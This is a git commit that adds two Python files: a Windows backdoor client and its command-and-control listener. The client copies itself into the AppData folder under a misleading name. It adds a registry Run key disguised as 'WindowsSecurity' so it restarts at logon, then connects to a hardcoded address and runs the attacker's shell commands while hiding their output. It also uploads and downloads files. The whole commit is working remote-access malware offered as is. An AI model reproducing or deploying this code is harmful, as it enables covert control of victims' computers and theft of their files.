ef6d83bd6e0b7bb465415733a2c11ec335aa7f18
Kuntal Dutta <88590817+K5e6Dtt@users.noreply.github.com>
2021-08-08 00:34:45 +0530

    Add files via upload

---
+++ backdoor.py
@@ -0,0 +1,86 @@
+from json.decoder import JSONDecodeError
+import socket,subprocess,json,os,base64,sys,shutil
+
+class Backdoor:
+    
+    def __init__(self,ip,port):
+        self.persistence()
+        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        self.connection.connect((ip,port))
+
+    def persistence(self):
+        location = os.environ["appdata"] + "\\System Binary.exe"
+        if not os.path.exists(location): #This checks wether the location exists or not
+            shutil.copyfile(sys.executable,location)
+            subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v WindowsSecurity /t REG_SZ /d "' + location + '"',shell=True,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
+
+    def send_data(self,data):
+        if type(data) != str:
+            json_data = json.dumps(data.decode('ISO-8859-1')) #This one is very important ISO-8859-1
+        else:
+            json_data = json.dumps(data)
+        self.connection.send(json_data.encode())
+
+    def receive_data(self):
+        json_data = ""
+        while True:
+            try:
+                json_data = json_data +  self.connection.recv(1024).decode()
+                return json.loads(json_data.encode())
+            except JSONDecodeError:  
+                continue
+    
+    def change_directory(self,path):
+        os.chdir(path)
+        return f"[+] Changed the working directory {path}"
+ 
+    def execute_command(self,reply):
+        try:
+            return subprocess.check_output(reply,shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)
+            #stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL this will hide the input and error in the console, the output is handles by check_output
+        except subprocess.CalledProcessError:
+            return b"[-]Invalid command!"
+    
+    def write_file(self,path,data):
+        with open(path,'wb') as file:
+            file.write(base64.b64decode(data))
+            return b"[+]Uploaded successfully!"
+
+    def read_file(self,path):
+        with open(path,'rb') as file:
+            return base64.b64encode(file.read())
+
+    def start_func(self,path):
+        subprocess.Popen(path,shell=True,stderr=subprocess.DEVNULL,stdout=subprocess.DEVNULL)
+        return b"[+]Appliction Started!!"
+
+    def run(self):
+        while True:
+            reply = self.receive_data()
+            try:
+                if reply[0] == 'exit':
+                    self.connection.close()
+                    sys.exit() #using sys.exit() will exit the program without any error message
+                elif reply[0] == 'cd' and len(reply) >1 :
+                    reply.remove('cd')
+                    name = ''
+                    for names in reply:
+                        name += names + ' '
+                    output = self.change_directory(name)
+                elif reply[0] == 'download':
+                    output = self.read_file(reply[1])
+                elif reply[0] == 'start':
+                    output = self.start_func(reply[1])    
+                elif reply[0] == 'upload':
+                    output = self.write_file(reply[1],reply[2])    
+                else: 
+                    output = self.execute_command(reply)
+            except Exception:
+                output = b"[-]Error in executing the command!!"        
+            self.send_data(output)
+
+try:
+    backdoor = Backdoor('192.168.0.106',5555)
+    backdoor.run()
+except Exception:
+    sys.exit()        
---
+++ server.py
@@ -0,0 +1,65 @@
+from json.decoder import JSONDecodeError
+import socket,json,base64
+
+
+class Listener:
+    def __init__(self,ip,port):
+        listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
+        listener.bind((ip,port))
+        listener.listen(0)
+        print("[+]Waiting for connection")
+        self.conn,addr = listener.accept()
+        print(f"[+]Connected to {addr}")
+
+    def send_data(self,data):
+        json_data = json.dumps(data)
+        self.conn.send(json_data.encode())
+
+    def receive_data(self):
+        json_data = ""
+        while True:
+            try:
+                json_data = json_data +  self.conn.recv(1024).decode()
+                return json.loads(json_data.encode())
+            except JSONDecodeError: #When the error stops it will return the json.loads
+                continue
+    
+    def write_file(self,path,data):
+        with open(path,'wb') as file:
+            file.write(base64.b64decode(data))
+            print("[+]File downloaded successfully")
+
+    def read_file(self,path):
+        with open(path,'rb') as file:
+            return base64.b64encode(file.read())
+
+    def execute_command(self,command):
+        self.send_data(command)
+
+        if command[0] == 'exit':
+            self.conn.close()
+            exit()
+
+        return self.receive_data()
+
+
+    def run(self):
+        while True:
+            command = input(">> ")
+            command = command.split(" ")
+            try:
+                if command[0] == 'upload':
+                    data = self.read_file(command[1])
+                    command.append(data.decode())
+                reply = self.execute_command(command)
+                if command[0] == 'download' and "[-]Error" not in command:
+                    self.write_file(command[1],reply)
+                else:
+                    print(reply)
+            except Exception:
+                print("[-]Error while executing the command!!")        
+
+
+listener = Listener("192.168.0.106",5555)
+listener.run()
